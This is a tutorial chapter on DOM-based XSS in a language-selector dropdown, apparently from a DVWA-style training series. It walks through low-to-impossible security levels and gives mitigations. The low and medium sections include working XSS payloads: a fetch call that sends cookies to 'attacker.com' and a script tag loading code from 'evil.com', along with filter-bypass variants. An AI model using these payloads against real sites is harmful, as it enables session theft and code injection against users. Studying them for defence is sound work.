# 10 — XSS (DOM-Based)

## What the feature does
A language-selector dropdown that uses client-side JavaScript to read the `default` query parameter and write it into the page — **the vulnerability lives entirely in client-side JS, never touching the server-side response**.

---

## LOW

```javascript
// Simplified client-side logic
document.write("<option value='" + document.location.href.split('default=')[1] + "'>...");
```

The URL parameter is read directly via `document.location` and written into the DOM via `document.write` / `innerHTML`, with no encoding.

**Exploitation:**
```
?default=<script>alert(document.cookie)</script>
```
Since the payload never reaches the server (it's parsed client-side from the URL fragment/query by JS), **server-side output-encoding fixes elsewhere in the app do nothing here** — this is why DOM XSS is its own category.

Real-world equivalent payload (cookie theft):
```
?default=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
```

**Why it works:** A **source** (`location.href`/`location.search`) flows, unsanitized, into a **sink** (`document.write`, `innerHTML`, `eval`) that the browser interprets as HTML/JS. This "source → sink" model is the standard way to reason about DOM XSS.

---

## MEDIUM

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    // crude denylist-style check/replace attempted on specific characters
}
```

**Why it's still bypassable:** Client-side denylist filters are visible in the page source and trivially reverse-engineered — an attacker just reads the JS to see exactly which strings are blocked and encodes/obfuscates around them:
```
?default=<img src=x onerror=alert(document.cookie)>
?default=<svg onload=alert(1)>
?default=<script%20src=//evil.com/x.js></script>   (URL-encoded space)
```

**Root issue:** Any client-side-only filtering can be inspected and bypassed by an attacker who can read the same JavaScript source the browser executes.

---

## HIGH

```javascript
// Uses a strict allowlist of valid dropdown values (e.g. matched against known language codes)
switch (document.location.href.indexOf("default=")) {
    // only pre-defined values accepted
}
```

**Why it's much stronger:** Restricting to a **fixed allowlist of expected values** (e.g. `en`, `fr`, `es`) means arbitrary attacker strings are never written into the DOM at all — this is close to correct *for this specific sink*. The residual risk in real applications is usually elsewhere: any *other* DOM sink in the same page that still uses unsanitized `innerHTML`/`document.write` reopens the same class of bug.

---

## IMPOSSIBLE

```javascript
// Uses safe DOM APIs (textContent, createElement + setAttribute) instead of
// innerHTML/document.write, and/or strict allowlisting combined with proper
// context-aware encoding for anything that must be dynamic.
```

**Why this is actually secure:** The fix isn't "better filtering" — it's **using DOM APIs that never interpret their input as markup**. `element.textContent = userInput` can never execute a script, regardless of what string it contains, because the browser treats it as plain text, not as HTML to be parsed. Combined with allowlisting valid values, there is no code path where attacker-controlled data reaches an HTML/JS-interpreting sink.

---

## Root Cause Summary
> DOM XSS is a client-side source → sink problem, invisible to server-side security controls. Fix it by using non-executing DOM APIs (`textContent`, `setAttribute`) for untrusted data, never `innerHTML`/`document.write`/`eval` — and never trust "the server encodes it" to cover client-side JS that reads the URL directly.

## Real-World Parallels
- DOM XSS is systematically underreported in code review because it never appears in server logs/WAF alerts (it never leaves the browser)
- Extremely common in SPA frameworks that manually manipulate the DOM outside the framework's built-in escaping (e.g. raw `dangerouslySetInnerHTML` in React, `[innerHTML]` bypass in Angular, `v-html` in Vue)
- OWASP Top 10: **A03:2021 – Injection**

## Mitigation Checklist
- [ ] Never use `innerHTML`, `document.write`, `eval`, `setTimeout(string)` with untrusted data
- [ ] Use `textContent`/`createElement`+`setAttribute` for untrusted data
- [ ] If a framework provides safe binding (React JSX, Angular interpolation), don't bypass it
- [ ] Content Security Policy as defense-in-depth (see Chapter 13)
- [ ] Client-side allowlisting of expected values where the input space is small
